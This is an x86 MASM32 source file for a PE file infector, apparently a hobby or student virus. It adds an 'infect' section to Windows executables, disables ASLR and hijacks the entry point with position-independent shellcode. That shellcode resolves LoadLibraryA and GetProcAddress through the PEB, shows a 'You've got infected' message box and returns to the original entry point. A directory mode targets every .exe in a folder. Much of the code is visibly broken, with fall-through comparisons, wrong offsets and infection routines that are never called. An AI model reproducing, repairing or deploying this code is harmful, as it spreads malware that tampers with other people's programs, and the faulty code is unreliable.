 
  .386
  .model flat, stdcall
  option casemap:none

  include c:\masm32\include\windows.inc
  include c:\masm32\macros\macros.asm

  include c:\masm32\include\masm32.inc
  include c:\masm32\include\gdi32.inc
  include c:\masm32\include\user32.inc
  include c:\masm32\include\kernel32.inc
  include c:\masm32\include\shell32.inc


  includelib c:\masm32\lib\masm32.lib
  includelib c:\masm32\lib\gdi32.lib
  includelib c:\masm32\lib\user32.lib
  includelib c:\masm32\lib\kernel32.lib
  includelib c:\masm32\lib\shell32.lib

  IMAGE_FIRST_SECTION MACRO pNtHeader:REQ
    lea eax, [pNtHeader + SIZEOF IMAGE_NT_HEADERS]
  ENDM
  .data 

    fileArg db "-f", 0
    directoryArg db "-d", 0
    usageMsg db "A simple utility for infecting Message Box into any PE32 EXE file", 0
    exampleMsg db "Example: -f <file.exe> -f", 0
    usageDesc db "Usage Description", 0
    fileDesc db "-f Infect Message Box into only one file", 0
    dirDesc db "-d Infect Message Box into one directory", 0

  .code
  
start:
  assume fs:nothing
  call main
  exit


GetAlign PROC sizeOfSection:DWORD, alignment:DWORD, address:DWORD
    ; Calculate size % alignment
    mov eax, sizeOfSection
    xor edx, edx
    div alignment

    ; If size % alignment == 0, return address + size
    test edx, edx
    jz _return_address_plus_size

    ; Otherwise, return address + (size / alignment + 1) * alignment
    inc eax
    imul eax, alignment
    add eax, address
    ret

_return_address_plus_size:
    add eax, address
    ret
GetAlign ENDP

GetEntryPoint PROC pNtHeader:DWORD, pByte:DWORD
  LOCAL first:DWORD
  LOCAL last:DWORD
  LOCAL originEntryPoint:DWORD

  ; Get first section
  mov eax, pNtHeader
  add eax, SIZEOF IMAGE_NT_HEADERS
  mov dword ptr [first], eax

  ; Get last section
  mov cx, [pNtHeader + IMAGE_NT_HEADERS.FileHeader.NumberOfSections]
  dec ecx
  mov eax, dword ptr [first]
  add eax, ecx
  shl eax, 5 ; Assuming SIZEOF IMAGE_SECTION_HEADER is 32 (0x20)
  mov dword ptr [last], eax

  ; Point pByte to address offset 0x100 of last section
  mov ecx, [last + IMAGE_SECTION_HEADER.PointerToRawData]
  mov eax, [ecx]
  add eax, [last + IMAGE_SECTION_HEADER.PointerToRawData]
  mov [ecx], eax
  mov eax, dword ptr [pByte]
  add eax, ecx
  mov dword ptr [pByte], eax

  ; Get origin entry point
  mov eax, [dword ptr [pByte] + 14]
  mov dword ptr [originEntryPoint], eax

  ; Return origin entry point
  mov eax, dword ptr [originEntryPoint]
  ret
GetEntryPoint ENDP

InfectSection proc hFile:DWORD, pNtHeader:DWORD, pByte:DWORD, fileSize:DWORD, bytesWritten:DWORD
  LOCAL pSectionHeader:DWORD
  LOCAL lastSection:DWORD
  LOCAL OEP:DWORD
  LOCAL start1: DWORD
  LOCAL end1: DWORD
  LOCAL endLabel: DWORD
  LOCAL address: DWORD
  ; Get the first and last section
  mov eax, [pNtHeader]
  add eax, sizeof IMAGE_NT_HEADERS
  mov ecx, [pNtHeader + 6] ; NumberOfSections
  dec ecx
  imul ecx, sizeof IMAGE_SECTION_HEADER
  add eax, ecx
  mov [lastSection], eax

  ; Set file pointer to the beginning
  invoke SetFilePointer, hFile, 0, 0, FILE_BEGIN

  ; Save the OEP
  mov eax, [pNtHeader + 40] ; AddressOfEntryPoint
  add eax, [pNtHeader + 34] ; ImageBase
  mov [OEP], eax

  ; Disable ASLR
  mov eax, IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE
  not eax
  and dword ptr [pNtHeader + 70], eax

  ; Change the EP to point to the last section created
  mov eax, [lastSection]
  mov eax, [eax]
  mov [pNtHeader + 40], eax ; AddressOfEntryPoint

  ; Write the file
  invoke WriteFile, hFile, pByte, fileSize, addr bytesWritten, 0

  ; Obtain the opcodes
  lea ebx, _loc1
  mov eax, start1
  mov [ebx], eax
  jmp _over
_loc1:
  mov eax, dword ptr fs:[30h]
  add eax, 0Ch
  mov eax, dword ptr [eax] ; PEB
  sub eax, 0Ch

  add eax, 0Ch
  mov eax, dword ptr [eax] ; Ldr
  sub eax, 0Ch

  add eax, 14h
  mov eax, dword ptr [eax] ; InInitializationOrderModuleList
  sub eax, 14h

  mov eax, dword ptr [eax] ; First module
  mov eax, dword ptr [eax] ; Second module

  add eax, 10h
  mov eax, dword ptr [eax] ; Base address
  sub eax, 10h

  mov ebx, dword ptr [start1]; Take the base address of kernel32
  mov eax, 3ch; PE header VMA
  mov edi, dword ptr [ebx]; Export table relative offset
  sub ebx, 3ch

  add ebx, eax
  add ebx, 78h; Export table VMA
  mov edi, dword ptr [ebx]; Number of names
  sub ebx, edi
  sub ebx, 78h

  add edi, 18h; Names table relative offset
  mov ecx, dword ptr [edi]; Number of names
  sub edi, 18h

  add edi, 20h; Names table VMA
  mov edx, dword ptr [edi]; Names table relative offset
  add edx, ebx; Names table VMA
  sub edi, 20h

_LLA :
  dec ecx
  mov esi, [edx + ecx * 4]; Store the relative offset of the name
  add esi, ebx; Set esi to the VMA of the current name
  cmp dword ptr[esi], 64616f4ch; backwards order of bytes L(4c)o(6f)a(61)d(64)
  je _LLALOOP1

_LLALOOP1 :
  cmp dword ptr[esi + 4], 7262694ch ;L(4c)i(69)b(62)r(72)
  je _LLALOOP2
_LLALOOP2 :
  cmp dword ptr[esi + 8], 41797261h; third dword = a(61)r(72)y(79)A(41)
  je _stop; if its = then jump to stop because we found it
  jmp _LLA; Load Libr aryA
_stop :
  mov edx, [edi + 24h]; Table of ordinals relative
  add edx, ebx; Table of ordinals
  mov cx, [edx + 2 * ecx]; function ordinal
  mov edx, [edi + 1ch]; Address table relative offset
  add edx, ebx; Table address
  mov eax, [edx + 4 * ecx]; ordinal offset
  add eax, ebx; Function VMA


  sub esp, 11
  mov ebx, esp
  mov byte ptr[ebx], 75h; u
  mov byte ptr[ebx + 1], 73h; s
  mov byte ptr[ebx + 2], 65h; e
  mov byte ptr[ebx + 3], 72h; r
  mov byte ptr[ebx + 4], 33h; 3
  mov byte ptr[ebx + 5], 32h; 2
  mov byte ptr[ebx + 6], 2eh; .
  mov byte ptr[ebx + 7], 64h; d
  mov byte ptr[ebx + 8], 6ch; l
  mov byte ptr[ebx + 9], 6ch; l
  mov byte ptr[ebx + 10], 0h

  push ebx

  call eax;
  add esp, 11
  push eax


  mov eax, fs:[30h]
  mov eax, [eax + 0ch]; 12
  mov eax, [eax + 14h]; 20
  mov eax, [eax]
  mov eax, [eax]
  mov eax, [eax + 10h]; 16

  mov ebx, eax; Take the base address of kernel32
  mov eax, [ebx + 3ch]; PE header VMA
  mov edi, [ebx + eax + 78h]; Export table relative offset
  add edi, ebx; Export table VMA
  mov ecx, [edi + 18h]; Number of names

  mov edx, [edi + 20h]; Names table relative offset
  add edx, ebx; Names table VMA
_GPA :
  dec ecx
  mov esi, [edx + ecx * 4]; Store the relative offset of the name
  add esi, ebx; Set esi to the VMA of the current name
  cmp dword ptr[esi], 50746547h; backwards order of bytes G(47)e(65)t(74)P(50)
  je _GPALOOP1

_GPALOOP1 :
  cmp dword ptr[esi + 4], 41636f72h;  r(72)o(6f)c(63)A(41)
  je _GPALOOP2
_GPALOOP2 :
  cmp dword ptr[esi + 8], 65726464h; third dword = d(64)d(64)r(72)e(65)
  je _stp; if its = then jump to stop because we found it
  jmp _GPA
_stp :
  mov   edx, [edi + 24h]; Table of ordinals relative
  add   edx, ebx; Table of ordinals
  mov   cx, [edx + 2 * ecx]; function ordinal
  mov   edx, [edi + 1ch]; Address table relative offset
  add   edx, ebx; Table address
  mov   eax, [edx + 4 * ecx]; ordinal offset
  add   eax, ebx; Function VMA 
  ; EAX HOLDS THE ADDRESS OF GetProcAddress
  mov esi, eax

  sub esp, 12
  mov ebx, esp
  mov byte ptr[ebx], 4dh; M
  mov byte ptr[ebx + 1], 65h ;e
  mov byte ptr[ebx + 2], 73h ;s
  mov byte ptr[ebx + 3], 73h ;s
  mov byte ptr[ebx + 4], 61h ;a
  mov byte ptr[ebx + 5], 67h ;g
  mov byte ptr[ebx + 6], 65h ;e
  mov byte ptr[ebx + 7], 42h ;B
  mov byte ptr[ebx + 8], 6fh ;o
  mov byte ptr[ebx + 9], 78h; x
  mov byte ptr[ebx + 10], 41h ;A
  mov byte ptr[ebx + 11], 0h

      ;;;;;;;;
         ; get back the value saved from LoadLibraryA return
         ; So that the call to GetProcAddress is:
          ;esi(saved eax{address of user32.dll module}, ebx {the string "MessageBoxA"})
  mov byte ptr[ebx], 89;      Y
  mov byte ptr[ebx + 1], 111; o
  mov byte ptr[ebx + 2], 117; u
  mov byte ptr[ebx + 3], 39; `
  mov byte ptr[ebx + 4], 118; v
  mov byte ptr[ebx + 5], 101; e
  mov byte ptr[ebx + 6], 32; 
  mov byte ptr[ebx + 7], 103; g
  mov byte ptr[ebx + 8], 111; o
  mov byte ptr[ebx + 9], 116; t
  mov byte ptr[ebx + 10], 32; 
  mov byte ptr[ebx + 11], 105; i
  mov byte ptr[ebx + 12], 110; n
  mov byte ptr[ebx + 13], 102; f
  mov byte ptr[ebx + 14], 101; e
  mov byte ptr[ebx + 15], 99;  c
  mov byte ptr[ebx + 16], 116; t
  mov byte ptr[ebx + 17], 101; e
  mov byte ptr[ebx + 18], 100; d
  mov byte ptr[ebx + 19], 0


  push 0
  push 0
  push ebx
  push 0
  call eax
  add esp, 8

  mov eax, 0deadbeefh ;Original Entry point
  jmp eax
_over:
  mov eax, offset _loc2
  mov [endLabel], eax
_loc2:

  ; Initialize variables
  mov edi, address
  mov esi, start1
  sub ecx, ecx ; Clear ecx
  sub ecx, start1 ; Subtract start1 from ecx
  add ecx, endLabel ; Add endLabel to ecx
  xor edx, edx
; Loop over bytes
_loop:
  ; Check for placeholder
  mov eax, [esi + edx]
  cmp eax, 0deadbeefh
  jne _next

  ; Replace placeholder with OEP
  carrier DWORD ?
  lea eax, [esi + edx]
  push ecx
  push edi
  push esi
  push edx
  invoke VirtualProtect, eax, 4, PAGE_EXECUTE_READWRITE, offset carrier
  mov eax, dword ptr [OEP]
  mov [esi + edx], eax
  pop edx
  pop esi
  pop edi
  pop ecx

_next:
  ; Copy byte
  mov al, [esi + edx]
  mov [edi + edx], al
  inc edx
  loop _loop

  ; Write to file
  lea eax, [lastSection + 76]
  invoke SetFilePointer, hFile, eax, NULL, FILE_BEGIN
  lea eax, address
  lea ebx, bytesWritten
  invoke WriteFile, hFile, eax, edx, ebx, NULL
  invoke CloseHandle, hFile

  mov eax, 1
  ret

InfectSection endp

CreateNewSection proc hFile:DWORD, pNtHeader:DWORD, pByte:DWORD, fileSize:DWORD, bytesWritten:DWORD, sizeOfSection:DWORD
  ; Get the first section headerI
  LOCAL infect[7]:BYTE

  ; Initialize the infect string
  mov byte ptr[infect], 105;      i
  mov byte ptr[infect + 1], 110;  n
  mov byte ptr[infect + 2], 102;  f
  mov byte ptr[infect + 3], 101;  e
  mov byte ptr[infect + 4], 99;   c
  mov byte ptr[infect + 5], 116;  t
  mov byte ptr[infect + 6], 0     ; null terminator
  IMAGE_FIRST_SECTION pNtHeader
  mov ebx, eax

  ; Get the number of sections
  mov eax, pNtHeader
  add eax, 6 ; Offset of NumberOfSections in IMAGE_FILE_HEADER
  movzx ecx, word ptr [eax]

  ; Section name
  lea eax, [infect]
  pop esi

  ; Check if the section already exists
  xor edx, edx
_checkSection:
  imul edx, edx, 40
  mov eax, [ebx + edx] ; Offset of Name in IMAGE_SECTION_HEADER
  cmp eax, esi
  je _sectionExists
  inc edx
  cmp edx, ecx
  jl _checkSection

  ; Initialize the new section header
  imul edx, edx, 40
  lea eax, [ebx + ecx]
  push eax  ; Save the original value of eax
  push ecx  ; Save the original value of ecx
  mov ecx, 40  ; Set the count to 40
  mov edi, eax  ; Set the destination to eax
  xor eax, eax  ; Set the value to 0
  rep stosb  ; Fill the memory with zeros
  pop ecx  ; Restore the original value of ecx
  pop eax  ; Restore the original value of eax
  mov [eax], esi


  ; Set the section attributes
  mov eax, [pNtHeader + 60]
  invoke GetAlign, sizeOfSection, eax, 0
  mov [eax + 8], eax ; Offset of Misc.VirtualSize in IMAGE_SECTION_HEADER
  sub ecx, 1 ; Subtract 1 from ecx
  imul ecx, ecx, 40 ; Multiply ecx by 40
  add ecx, 8 ; Add 8 to ecx
  mov edx, [ebx + ecx] ; Get the value at the effective address
  mov eax, [pNtHeader + 56]

  sub ecx, 1 ; Subtract 1 from ecx
  imul ecx, ecx, 40 ; Multiply ecx by 40
  add ecx, 12 ; Add 12 to ecx
  mov edi, [ebx + ecx] ; Get the value at the effective address

  invoke GetAlign, edx, eax, edi
  mov [eax + 12], eax ; Offset of VirtualAddress in IMAGE_SECTION_HEADER
  invoke GetAlign, sizeOfSection, [pNtHeader + 60], 0
  mov [eax + 16], eax ; Offset of SizeOfRawData in IMAGE_SECTION_HEADER
  sub ecx, 1 ; Subtract 1 from ecx
  imul ecx, ecx, 40 ; Multiply ecx by 40
  add ecx, 16 ; Add 16 to ecx
  mov edx, [ebx + ecx] ; Get the value at the effective address
  mov eax, [pNtHeader + 56]
  sub ecx, 1 ; Subtract 1 from ecx
  imul ecx, ecx, 40 ; Multiply ecx by 40
  add ecx, 12 ; Add 12 to ecx
  mov edi, [ebx + ecx] ; Get the value at the effective address
  invoke GetAlign, edx, eax, edi 
  mov [eax + 20], eax ; Offset of PointerToRawData in IMAGE_SECTION_HEADER
  mov dword ptr [eax + 36], 0E00000E0h ; Offset of Characteristics in IMAGE_SECTION_HEADER

  ; Update the file
  invoke SetFilePointer, hFile, [eax + 20] + [eax + 16], 0, FILE_BEGIN
  invoke SetEndOfFile, hFile
  mov edx, [eax + 12]
  add edx, [eax + 8]
  add [pNtHeader + 80], edx ; Offset of SizeOfImage in IMAGE_OPTIONAL_HEADER
  inc word ptr [pNtHeader + 6]
  invoke SetFilePointer, hFile, 0, 0, FILE_BEGIN
  invoke WriteFile, hFile, pByte, fileSize, addr bytesWritten, 0
  mov eax, 1
  ret

_sectionExists:
  invoke CloseHandle, hFile
  xor eax, eax
  ret
CreateNewSection endp

OpenFile1 PROC nameOfFile:PTR BYTE 
  LOCAL hFile:HANDLE
  LOCAL fileSize:DWORD
  LOCAL pByte:PTR BYTE
  LOCAL byteWritten:DWORD
  LOCAL pDosHeader:PTR IMAGE_DOS_HEADER
  LOCAL pNtHeader:PTR IMAGE_NT_HEADERS
  LOCAL hHeap:HANDLE

  ; Open the file
  invoke CreateFile, ADDR nameOfFile, GENERIC_READ or GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL
  mov eax, hFile
  cmp eax, INVALID_HANDLE_VALUE
  je _exit

  ; Get the file size
  invoke GetFileSize, hFile, NULL
  mov eax, fileSize
  cmp eax, 0
  je _closeHandle

  invoke GetProcessHeap ; Get a handle to the process's heap
  
  
  invoke HeapAlloc, eax, 0, fileSize ; Allocate memory from the heap
  test eax, eax ; Check if HeapAlloc succeeded
  jz _closeHandle ; If eax is NULL, allocation failed
  mov pByte, eax ; Save the pointer to the allocated memory

  ; Read the file into memory
  invoke ReadFile, hFile, pByte, fileSize, ADDR byteWritten, NULL
  mov eax, dword ptr [byteWritten]  
  mov ebx, dword ptr [fileSize]
  cmp eax, ebx
  jne _freeMemory ; If not, something went wrong

  ; Check the DOS header
  mov eax, pByte
  mov pDosHeader, eax
  cmp WORD PTR [eax], IMAGE_DOS_SIGNATURE
  jne _freeMemory

  ; Check the NT header
  add eax, [eax + 3Ch]  ; e_lfanew field offset in IMAGE_DOS_HEADER
  mov pNtHeader, eax
  cmp DWORD PTR [eax], IMAGE_NT_SIGNATURE
  jne _freeMemory

  ; Additional processing (ensure these procedures are defined)
  ; You should check the result of each invoke and handle errors if needed

  ; ... Your additional code ...

  ; Successful end of the procedure
  jmp _endProcedure

_freeMemory:
  ; Free the allocated memory
  push pByte ; Save pByte for later
  invoke GlobalFree, pByte
  pop pByte ; Restore pByte

_closeHandle:
  ; Close the file handle
  invoke CloseHandle, hFile

_endProcedure:
_exit:
  ; Return from the procedure
  ret
OpenFile1 ENDP


OpenDirectory proc pathDirectory:DWORD
  LOCAL hFind:HANDLE
  LOCAL findData:WIN32_FIND_DATA
  LOCAL filePath[512]:BYTE
  LOCAL exeExtension[6]:BYTE
  LOCAL countFile:DWORD

  mov countFile, 0

  lea eax, [pathDirectory]
  lea ebx, [filePath]
  lea ecx, [exeExtension]


  ; Initialize exeExtension with "\*.exe\0"
  mov byte ptr [ecx], 5Ch ; '\'
  mov byte ptr [ecx+1], 2Ah ; '*'
  mov byte ptr [ecx+2], 2Eh ; '.'
  mov byte ptr [ecx+3], 65h ; 'e'
  mov byte ptr [ecx+4], 78h ; 'x'
  mov byte ptr [ecx+5], 65h ; 'e'
  mov byte ptr [ecx+6], 00h ; null terminator

  invoke lstrcpy, ebx, eax 
  invoke lstrcat, ebx, ecx 

  invoke FindFirstFile, addr filePath, addr findData
  cmp eax, INVALID_HANDLE_VALUE
  je _exit
  mov hFind, eax

_nextFile:
  invoke OpenFile1, addr findData.cFileName
  inc countFile

  invoke FindNextFile, hFind, addr findData
  cmp eax, 0
  jne _nextFile

  invoke FindClose, hFind

  cmp countFile, 0
  je _exit

  mov eax, 1
  ret

_exit:
  xor eax, eax
  ret
OpenDirectory endp




main proc
  LOCAL cmdline:DWORD
  LOCAL cmdlen:DWORD
  LOCAL secondArg[256]:BYTE  
  LOCAL pSecondArg:DWORD
  LOCAL pThirdArg:DWORD
  ;Get command line
  invoke GetCommandLineW
  mov cmdline, eax
  
  invoke CommandLineToArgvW, cmdline, ADDR cmdlen
  mov ebx, eax  ; Save the pointer to the array of arguments
  
  mov eax, [cmdlen]
  cmp eax, 2
  jl _printUsage
  
  ; Get the second argument
  mov eax, [ebx + 4]  ; Get the pointer to the second argument
  invoke lstrcmpW, eax, offset fileArg
  cmp eax, 0
  jne _openFile

  invoke lstrcmpW, pSecondArg, offset directoryArg
  cmp eax, 0
  je _openDirectory

_printUsage:
  print offset usageMsg
  print offset exampleMsg
  print offset usageDesc
  print offset fileDesc
  print offset dirDesc
  jmp _exit


_openFile:
  mov eax, [ebx + 8]
  push eax
  call OpenFile1
  jmp _exit

_openDirectory:
  mov eax, [eax + 12]
  mov pThirdArg, eax
  push eax
  call OpenDirectory
  jmp _exit

_exit:
  invoke ExitProcess, 0


  ret
main endp

end start

